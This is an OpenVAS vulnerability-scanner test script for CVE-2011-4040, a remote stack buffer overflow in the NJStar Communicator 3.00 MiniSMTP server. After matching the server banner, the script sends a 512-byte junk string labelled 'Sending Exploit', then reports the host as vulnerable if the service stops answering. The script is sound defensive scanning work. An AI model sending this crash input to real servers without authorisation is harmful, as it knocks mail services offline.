###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_njstar_communicator_minismtp_server_bof_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# NJStar Communicator MiniSMTP Server Remote Stack Buffer Overflow Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802266");
  script_version("$Revision: 11997 $");
  script_cve_id("CVE-2011-4040");
  script_bugtraq_id(50452);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-11-08 19:46:14 +0530 (Tue, 08 Nov 2011)");
  script_name("NJStar Communicator MiniSMTP Server Remote Stack Buffer Overflow Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/46630");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18057");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl", "smtpserver_detect.nasl");
  script_require_ports("Services/smtp", 25);
  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to execute
arbitrary code within the context of the application or cause a denial of
service condition.");
  script_tag(name:"affected", value:"NJStar Communicator Version 3.00");
  script_tag(name:"insight", value:"The flaw is due to a boundary error within the MiniSmtp server when
processing packets. This can be exploited to cause a stack-based buffer
overflow via a specially crafted packet sent to TCP port 25.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"The host is running NJStar Communicator MiniSMTP Server and is
prone to buffer overflow vulnerability.");
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("smtp_func.inc");

port = get_kb_item("Services/smtp");
if(!port) {
  port = 25;
}

if(get_kb_item('SMTP/'+port+'/broken')) {
  exit(0);
}

if(!get_port_state(port)) {
  exit(0);
}

## Open SMTP Socket
if(!soc = smtp_open(port:port)) {
  exit(0);
}

res = recv(socket:soc, length:512);

send(socket:soc, data:'HELP\r\n');
res = recv(socket:soc, length:1024);
if("E-mail Server From NJStar Software" >!< res)
{
  smtp_close(socket:soc);
  exit(0);

}

## Sending Exploit
send(socket:soc, data:crap(512));
smtp_close(socket:soc);

if(!soc = smtp_open(port:port))
{
  security_message(port);
  exit(0);
}
smtp_close(socket:soc);
